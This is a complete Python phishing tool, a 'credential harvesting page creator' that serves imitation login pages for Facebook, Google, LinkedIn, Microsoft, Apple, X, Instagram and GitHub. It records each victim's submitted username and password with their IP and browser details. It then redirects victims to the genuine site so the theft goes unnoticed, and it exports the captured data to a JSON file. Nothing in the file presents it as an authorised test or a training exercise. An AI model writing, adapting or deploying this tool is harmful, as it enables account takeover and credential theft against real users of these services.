#!/usr/bin/env python3
import os
import http.server
import socketserver
import threading
import json
import time
from datetime import datetime
from urllib.parse import parse_qs, urlparse
import base64

class CredentialHarvester:
    def __init__(self):
        self.captured_data = []
        self.server = None
        self.port = 80
        
        self.pages = {
            'facebook': {
                'html': '''<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Facebook - Log In or Sign Up</title><style>body{margin:0;padding:0;font-family:Helvetica,Arial,sans-serif;background:#f0f2f5}*{box-sizing:border-box}.main{display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}.content{max-width:980px;width:100%;display:flex;gap:100px;align-items:center}.left{flex:1}.logo{color:#1877f2;font-size:60px;font-weight:bold;margin:0 0 10px}.tagline{font-size:28px;line-width:32px}.right{flex:1}.box{background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;max-width:396px}input{width:100%;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px}input:focus{border-color:#1877f2;outline:none}.btn{width:100%;background:#1877f2;border:none;border-radius:6px;font-size:20px;line-height:48px;padding:0 16px;color:#fff;font-weight:bold;cursor:pointer}.btn:hover{background:#166fe5}.divider{display:flex;align-items:center;text-align:center;margin:20px 0;color:#8a8d91}.divider:before,.divider:after{content:'';flex:1;border-bottom:1px solid #dadde1}.divider:not(:empty):before{margin-right:10px}.divider:not(:empty):after{margin-left:10px}.create{text-align:center;margin-top:20px}.create-btn{background:#42b72a;border:none;border-radius:6px;font-size:17px;line-height:48px;padding:0 16px;color:#fff;font-weight:bold;cursor:pointer;display:inline-block}.create-btn:hover{background:#36a420}a{text-decoration:none;color:#1877f2}a:hover{text-decoration:underline}</style></head><body><div class="main"><div class="content"><div class="left"><h1 class="logo">facebook</h1><p class="tagline">Connect with friends and the world around you on Facebook.</p></div><div class="right"><div class="box"><form method="POST" action="/harvest"><input type="text" name="email" placeholder="Email or phone number" required><input type="password" name="pass" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><a href="#" style="display:block;text-align:center;margin:16px 0">Forgot password?</a><div class="divider"></div><div class="create"><button class="create-btn">Create new account</button></div></div><p style="margin-top:28px;font-size:14px"><a href="#"><b>Create a Page</b></a> for a celebrity, brand or business.</p></div></div></div></body></html>''',
                'redirect': 'https://www.facebook.com',
                'name': 'Facebook'
            },
            'google': {
                'html': '''<!DOCTYPE html><html><head><title>Sign in - Google Accounts</title><style>body{font-family:Roboto,Arial,sans-serif;background:#fff;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px}.logo{text-align:center;margin-bottom:16px}.logo img{height:24px}h1{font-size:24px;font-weight:400;margin:0 0 8px;color:#202124}.subtitle{font-size:16px;color:#202124;margin:0 0 24px}input{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;margin-bottom:24px;box-sizing:border-box}input:focus{border-color:#1a73e8;outline:none}.btn-container{display:flex;justify-content:space-between;margin-top:32px}.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;padding:9px 24px;font-size:14px;font-weight:500;cursor:pointer}.btn:hover{background:#1765cc}a{color:#1a73e8;text-decoration:none;font-size:14px}a:hover{text-decoration:underline}.help{margin-top:24px;display:flex;justify-content:space-between;font-size:14px}</style></head><body><div class="container"><div class="logo"><svg viewBox="0 0 75 24" width="75" height="24"><g><path fill="#ea4335" d="M67.954 16.303c-1.025 0-1.945-.408-2.586-1.05-.64-.642-1.048-1.56-1.048-2.585 0-1.025.408-1.945 1.048-2.585.641-.641 1.561-1.05 2.586-1.05 1.024 0 1.944.409 2.584 1.05.641.64 1.05 1.56 1.05 2.585 0 1.025-.409 1.943-1.05 2.585-.64.642-1.56 1.05-2.584 1.05z"/><path fill="#4285f4" d="M58.99 8.708c.99 0 1.81.353 2.46 1.002.651.65 1.003 1.47 1.003 2.46v6.145h-1.76V12.17c0-.615-.202-1.13-.605-1.532-.403-.403-.92-.605-1.547-.605-.643 0-1.183.218-1.618.653-.436.435-.653.975-.653 1.618v6.01h-1.76V9.024h1.697v.82c.3-.303.654-.54 1.063-.713.408-.173.847-.26 1.315-.26h.405z"/><path fill="#fbbc05" d="M49.027 3.927v12.387h-1.76V3.927z"/><path fill="#34a853" d="M43.76 8.708c.99 0 1.81.353 2.46 1.002.651.65 1.003 1.47 1.003 2.46v6.145h-1.76V12.17c0-.615-.202-1.13-.605-1.532-.403-.403-.92-.605-1.547-.605-.643 0-1.183.218-1.618.653-.436.435-.653.975-.653 1.618v6.01h-1.76V9.024h1.697v.82c.3-.303.654-.54 1.063-.713.408-.173.847-.26 1.315-.26h.405z"/><path fill="#ea4335" d="M32.883 12.315c0-1.035.395-1.917 1.185-2.644.79-.727 1.77-1.09 2.937-1.09 1.168 0 2.147.363 2.938 1.09.79.727 1.185 1.609 1.185 2.644 0 1.035-.395 1.916-1.185 2.643-.791.727-1.77 1.09-2.938 1.09-1.167 0-2.147-.363-2.937-1.09-.79-.727-1.185-1.608-1.185-2.643z"/><path fill="#4285f4" d="M25.01 8.708c.99 0 1.81.353 2.46 1.002.651.65 1.003 1.47 1.003 2.46v6.145h-1.76V12.17c0-.615-.202-1.13-.605-1.532-.403-.403-.92-.605-1.547-.605-.643 0-1.183.218-1.618.653-.436.435-.653.975-.653 1.618v6.01h-1.76V9.024h1.697v.82c.3-.303.654-.54 1.063-.713.408-.173.847-.26 1.315-.26h.405z"/></g></svg></div><h1>Sign in</h1><p class="subtitle">to continue to Google</p><form method="POST" action="/harvest"><input type="email" name="email" placeholder="Email or phone" required><input type="password" name="password" placeholder="Enter your password" required><div class="btn-container"><button type="submit" class="btn">Next</button></div></form><div class="help"><a href="#">Create account</a><a href="#">Need help?</a></div></div></body></html>''',
                'redirect': 'https://accounts.google.com',
                'name': 'Google'
            },
            'linkedin': {
                'html': '''<!DOCTYPE html><html><head><title>LinkedIn Login, Sign in | LinkedIn</title><style>body{font-family:system-ui,-apple-system,Segoe UI,Helvetica,Arial,sans-serif;background:#f3f2ef;margin:0;padding:0}.container{max-width:400px;margin:80px auto;background:#fff;border-radius:8px;box-shadow:0 0 0 1px rgba(0,0,0,.15),0 2px 3px rgba(0,0,0,.2);padding:24px}.logo{text-align:center;margin-bottom:24px;color:#0a66c2;font-size:34px;font-weight:700}h1{font-size:32px;font-weight:400;margin:0 0 8px;color:rgba(0,0,0,.9)}.subtitle{font-size:14px;color:rgba(0,0,0,.6);margin:0 0 16px}label{display:block;font-size:14px;font-weight:600;margin-bottom:4px;color:rgba(0,0,0,.9)}input{width:100%;padding:12px;border:1px solid rgba(0,0,0,.6);border-radius:4px;font-size:16px;margin-bottom:16px;box-sizing:border-box}input:focus{border-color:#0a66c2;outline:none}.forgot{color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}.btn{width:100%;background:#0a66c2;color:#fff;border:none;border-radius:24px;padding:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:16px}.btn:hover{background:#004182}.divider{display:flex;align-items:center;text-align:center;margin:24px 0;color:rgba(0,0,0,.6)}.divider:before,.divider:after{content:'';flex:1;border-bottom:1px solid rgba(0,0,0,.15)}.divider:not(:empty):before{margin-right:16px}.divider:not(:empty):after{margin-left:16px}.join{text-align:center;margin-top:16px;font-size:14px}a{color:#0a66c2;text-decoration:none}a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="logo">Linked<span style="background:#0a66c2;color:#fff;padding:0 3px;border-radius:2px">in</span></div><h1>Sign in</h1><p class="subtitle">Stay updated on your professional world</p><form method="POST" action="/harvest"><label>Email or Phone</label><input type="text" name="username" required><label>Password</label><input type="password" name="password" required><a href="#" class="forgot">Forgot password?</a><button type="submit" class="btn">Sign in</button></form><div class="divider">or</div><div class="join">New to LinkedIn? <a href="#"><b>Join now</b></a></div></div></body></html>''',
                'redirect': 'https://www.linkedin.com',
                'name': 'LinkedIn'
            },
            'microsoft': {
                'html': '''<!DOCTYPE html><html><head><title>Sign in to your Microsoft account</title><style>body{font-family:Segoe UI,Segoe WP,Tahoma,Arial,sans-serif;background:#f2f2f2;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{background:#fff;width:440px;padding:44px;box-shadow:0 2px 6px rgba(0,0,0,.2)}.logo{display:flex;align-items:center;margin-bottom:24px;font-size:21px;font-weight:600}.ms-logo{margin-right:10px;display:flex;gap:2px}.square{width:10px;height:10px}h1{font-size:24px;font-weight:600;margin:0 0 12px;color:#1b1b1b}input{width:100%;padding:10px 12px;border:1px solid #8a8886;font-size:15px;margin:8px 0;box-sizing:border-box}input:focus{border-color:#0067b8;outline:none}.btn{width:100%;background:#0067b8;color:#fff;border:none;padding:11px;font-size:15px;cursor:pointer;margin-top:8px}.btn:hover{background:#005a9e}.options{margin-top:16px;font-size:13px}a{color:#0067b8;text-decoration:none}a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="logo"><div class="ms-logo"><div class="square" style="background:#f25022"></div><div class="square" style="background:#7fba00"></div><div class="square" style="background:#00a4ef"></div><div class="square" style="background:#ffb900"></div></div>Microsoft</div><h1>Sign in</h1><form method="POST" action="/harvest"><input type="text" name="email" placeholder="Email, phone, or Skype" required><input type="password" name="password" placeholder="Password" required><div class="options"><input type="checkbox" id="remember"> <label for="remember">Keep me signed in</label></div><button type="submit" class="btn">Sign in</button></form><div class="options" style="margin-top:24px"><a href="#">Can\'t access your account?</a><br><a href="#">Sign-in options</a></div></div></body></html>''',
                'redirect': 'https://account.microsoft.com',
                'name': 'Microsoft'
            },
            'apple': {
                'html': '''<!DOCTYPE html><html><head><title>Sign In - Apple</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Helvetica Neue,Helvetica,sans-serif;background:#000;color:#fff;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:400px;text-align:center}.logo{font-size:52px;margin-bottom:32px}h1{font-size:32px;font-weight:600;margin:0 0 8px}.subtitle{font-size:17px;color:#a1a1a6;margin:0 0 32px}input{width:100%;background:rgba(255,255,255,.15);border:1px solid rgba(255,255,255,.3);color:#fff;padding:16px;font-size:17px;border-radius:12px;margin-bottom:16px;box-sizing:border-box}input::placeholder{color:#a1a1a6}input:focus{background:rgba(255,255,255,.2);outline:none;border-color:rgba(255,255,255,.5)}.btn{width:100%;background:#0071e3;color:#fff;border:none;border-radius:12px;padding:16px;font-size:17px;font-weight:600;cursor:pointer;margin-top:8px}.btn:hover{background:#0077ed}a{color:#0071e3;text-decoration:none;font-size:14px;display:inline-block;margin-top:16px}a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="logo"></div><h1>Sign in with your Apple ID</h1><p class="subtitle">Enter your Apple ID and password</p><form method="POST" action="/harvest"><input type="text" name="email" placeholder="Apple ID" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Continue</button></form><a href="#">Forgot Apple ID or password?</a></div></body></html>''',
                'redirect': 'https://appleid.apple.com',
                'name': 'Apple ID'
            },
            'twitter': {
                'html': '''<!DOCTYPE html><html><head><title>X. It\'s what\'s happening</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#000;color:#e7e9ea;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:600px;padding:20px}.logo{font-size:42px;margin-bottom:48px}h1{font-size:31px;font-weight:700;margin:0 0 32px}input{width:100%;background:#000;border:1px solid #333;color:#e7e9ea;padding:20px;font-size:17px;border-radius:4px;margin-bottom:24px;box-sizing:border-box}input:focus{border-color:#1d9bf0;outline:none}.btn{width:100%;background:#e7e9ea;color:#000;border:none;border-radius:9999px;padding:16px;font-size:17px;font-weight:700;cursor:pointer}.btn:hover{background:#d7dbdc}a{color:#1d9bf0;text-decoration:none;font-size:15px}a:hover{text-decoration:underline}.forgot{margin-top:24px}</style></head><body><div class="container"><div class="logo">𝕏</div><h1>Sign in to X</h1><form method="POST" action="/harvest"><input type="text" name="username" placeholder="Phone, email, or username" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Next</button></form><div class="forgot"><a href="#">Forgot password?</a> · <a href="#">Sign up for X</a></div></div></body></html>''',
                'redirect': 'https://twitter.com',
                'name': 'X (Twitter)'
            },
            'instagram': {
                'html': '''<!DOCTYPE html><html><head><title>Instagram</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica,Arial,sans-serif;background:#fafafa;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:350px;background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px}.logo{font-family:Billabong,Brush Script MT,cursive;font-size:52px;text-align:center;margin-bottom:32px}input{width:100%;background:#fafafa;border:1px solid #dbdbdb;padding:10px;font-size:14px;margin-bottom:8px;box-sizing:border-box;border-radius:3px}input:focus{outline:none;border-color:#a8a8a8}.btn{width:100%;background:#0095f6;color:#fff;border:none;border-radius:8px;padding:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:12px}.btn:hover{background:#1877f2}.divider{display:flex;align-items:center;text-align:center;margin:20px 0;color:#8e8e8e;font-size:13px}.divider:before,.divider:after{content:'';flex:1;border-bottom:1px solid #dbdbdb}.divider:not(:empty):before{margin-right:16px}.divider:not(:empty):after{margin-left:16px}.fb-login{color:#385185;text-decoration:none;font-weight:600;font-size:14px;display:flex;align-items:center;justify-content:center;margin-top:20px}.forgot{text-align:center;margin-top:16px;font-size:12px}a{color:#00376b;text-decoration:none}a:hover{text-decoration:underline}</style></head><body><div class="container"><div class="logo">Instagram</div><form method="POST" action="/harvest"><input type="text" name="username" placeholder="Phone number, username, or email" required><input type="password" name="password" placeholder="Password" required><button type="submit" class="btn">Log In</button></form><div class="divider">OR</div><a href="#" class="fb-login">🔵 Log in with Facebook</a><div class="forgot"><a href="#">Forgot password?</a></div></div></body></html>''',
                'redirect': 'https://www.instagram.com',
                'name': 'Instagram'
            },
            'github': {
                'html': '''<!DOCTYPE html><html><head><title>Sign in to GitHub</title><style>body{font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;background:#0d1117;color:#c9d1d9;margin:0;padding:0;display:flex;justify-content:center;align-items:center;min-height:100vh}.container{width:340px;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:24px}.logo{text-align:center;font-size:48px;margin-bottom:16px}h1{font-size:24px;font-weight:300;text-align:center;margin:0 0 16px}label{display:block;font-size:14px;font-weight:600;margin-bottom:8px}input{width:100%;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;padding:10px 12px;font-size:14px;margin-bottom:16px;border-radius:6px;box-sizing:border-box}input:focus{border-color:#58a6ff;outline:none}.btn{width:100%;background:#238636;color:#fff;border:none;border-radius:6px;padding:10px;font-size:14px;font-weight:500;cursor:pointer}.btn:hover{background:#2ea043}.link{color:#58a6ff;text-decoration:none;font-size:12px}a:hover{text-decoration:underline}.signup{text-align:center;margin-top:16px;padding-top:16px;border-top:1px solid #30363d;color:#7d8590;font-size:14px}</style></head><body><div class="container"><div class="logo">⚫</div><h1>Sign in to GitHub</h1><form method="POST" action="/harvest"><label>Username or email address</label><input type="text" name="login" required><label>Password</label><input type="password" name="password" required><a href="#" class="link">Forgot password?</a><button type="submit" class="btn" style="margin-top:16px">Sign in</button></form><div class="signup">New to GitHub? <a href="#" class="link">Create an account</a></div></div></body></html>''',
                'redirect': 'https://github.com',
                'name': 'GitHub'
            }
        }
    
    def create_handler(self, harvester):
        class HarvestHandler(http.server.BaseHTTPRequestHandler):
            def log_message(self, format, *args):
                pass
            
            def do_GET(self):
                page_type = self.path.strip('/') or 'facebook'
                
                if page_type in harvester.pages:
                    self.send_response(200)
                    self.send_header('Content-type', 'text/html')
                    self.end_headers()
                    
                    html = harvester.pages[page_type]['html']
                    self.wfile.write(html.encode())
                
                else:
                    self.send_response(404)
                    self.end_headers()
            
            def do_POST(self):
                if self.path == '/harvest':
                    content_length = int(self.headers['Content-Length'])
                    post_data = self.rfile.read(content_length).decode('utf-8')
                    
                    credentials = {}
                    for param in post_data.split('&'):
                        if '=' in param:
                            key, value = param.split('=', 1)
                            credentials[key] = value.replace('%40', '@').replace('+', ' ').replace('%2B', '+')
                    
                    capture = {
                        'timestamp': datetime.now().isoformat(),
                        'ip': self.client_address[0],
                        'credentials': credentials,
                        'user_agent': self.headers.get('User-Agent', 'Unknown'),
                        'referer': self.headers.get('Referer', 'Direct'),
                        'accept_language': self.headers.get('Accept-Language', 'Unknown')
                    }
                    
                    harvester.captured_data.append(capture)
                    
                    print(f"\n\033[91m[!] CREDENTIALS CAPTURED\033[0m")
                    print(f"\033[97m    Timestamp: {capture['timestamp']}\033[0m")
                    print(f"\033[97m    IP: {capture['ip']}\033[0m")
                    for key, val in credentials.items():
                        print(f"\033[93m    {key}: {val}\033[0m")
                    print(f"\033[97m    User-Agent: {capture['user_agent'][:60]}...\033[0m\n")
                    
                    referer = self.headers.get('Referer', '')
                    redirect_url = 'https://www.google.com'
                    
                    for page_name, page_data in harvester.pages.items():
                        if page_name in referer:
                            redirect_url = page_data['redirect']
                            break
                    
                    self.send_response(302)
                    self.send_header('Location', redirect_url)
                    self.end_headers()
                
                else:
                    self.send_response(404)
                    self.end_headers()
        
        return HarvestHandler
    
    def start_server(self, port=80):
        try:
            handler = self.create_handler(self)
            self.server = socketserver.TCPServer(('0.0.0.0', port), handler)
            self.port = port
            
            print(f"\033[92m[+] Credential harvester started: http://localhost:{port}\033[0m")
            
            server_thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            server_thread.start()
            
            return True
        
        except PermissionError:
            print(f"\033[91m[!] Permission denied for port {port}\033[0m")
            print(f"\033[97m[*] Try a port > 1024 or run as administrator\033[0m")
            return False
        except Exception as e:
            print(f"\033[91m[!] Error: {e}\033[0m")
            return False
    
    def export_captures(self, filename='harvested_credentials.json'):
        try:
            data = {
                'total_captures': len(self.captured_data),
                'captures': self.captured_data,
                'export_time': datetime.now().isoformat()
            }
            
            with open(filename, 'w') as f:
                json.dump(data, f, indent=2)
            
            print(f"\033[92m[+] Exported {len(self.captured_data)} captures to {filename}\033[0m")
        
        except Exception as e:
            print(f"\033[91m[!] Export failed: {e}\033[0m")
    
    def display_stats(self):
        print(f"\n\033[92m{'='*70}\033[0m")
        print(f"\033[92m[*] HARVEST STATISTICS\033[0m")
        print(f"\033[92m{'='*70}\033[0m\n")
        
        print(f"\033[97mTotal captures: {len(self.captured_data)}\033[0m")
        
        if self.captured_data:
            ips = {}
            for capture in self.captured_data:
                ip = capture['ip']
                ips[ip] = ips.get(ip, 0) + 1
            
            print(f"\n\033[97mUnique IPs: {len(ips)}\033[0m")
            
            print(f"\n\033[97mTop IPs:\033[0m")
            for ip, count in sorted(ips.items(), key=lambda x: x[1], reverse=True)[:5]:
                print(f"\033[97m  {ip}: {count} captures\033[0m")
            
            print(f"\n\033[97mRecent captures:\033[0m")
            for capture in self.captured_data[-5:]:
                print(f"\033[93m  [{capture['timestamp']}] {capture['ip']}\033[0m")
                for key, val in capture['credentials'].items():
                    print(f"\033[97m    {key}: {val}\033[0m")

def run():
    print("\033[92m" + "="*70)
    print("     CREDENTIAL HARVESTING PAGE CREATOR")
    print("="*70 + "\033[0m\n")
    
    harvester = CredentialHarvester()
    
    print("\033[97mOperation mode:\033[0m")
    print("  [1] Start credential harvester")
    print("  [2] View available templates")
    print("  [3] Export captured data")
    print("  [4] View statistics")
    
    mode = input("\n\033[95m[?] Select: \033[0m").strip()
    
    if mode == '1':
        port = input("\033[95m[?] Port (default 8080): \033[0m").strip()
        port = int(port) if port.isdigit() else 8080
        
        if harvester.start_server(port):
            print(f"\n\033[97mAvailable pages:\033[0m")
            for page_name, page_data in harvester.pages.items():
                print(f"\033[97m  http://localhost:{port}/{page_name} - {page_data['name']}\033[0m")
            
            print(f"\n\033[93m[*] Server running...\033[0m")
            print(f"\033[97m[*] Monitoring for credentials...\033[0m")
            print(f"\033[97m[*] Press Ctrl+C to stop\033[0m\n")
            
            try:
                while True:
                    time.sleep(1)
            except KeyboardInterrupt:
                harvester.display_stats()
                
                export = input("\n\033[95m[?] Export captures? (y/n): \033[0m").strip().lower()
                if export == 'y':
                    filename = input("\033[95m[?] Filename (harvested_credentials.json): \033[0m").strip()
                    harvester.export_captures(filename if filename else 'harvested_credentials.json')
    
    elif mode == '2':
        print(f"\n\033[97mAvailable Templates:\033[0m\n")
        for page_name, page_data in harvester.pages.items():
            print(f"\033[92m{page_name.upper()}\033[0m")
            print(f"\033[97m  Name: {page_data['name']}\033[0m")
            print(f"\033[97m  Redirect: {page_data['redirect']}\033[0m")
            print()
    
    elif mode == '3':
        filename = input("\033[95m[?] Filename (harvested_credentials.json): \033[0m").strip()
        harvester.export_captures(filename if filename else 'harvested_credentials.json')
    
    elif mode == '4':
        harvester.display_stats()
    
    print(f"\n\033[92m[+] Done\033[0m")

if __name__ == "__main__":
    run()
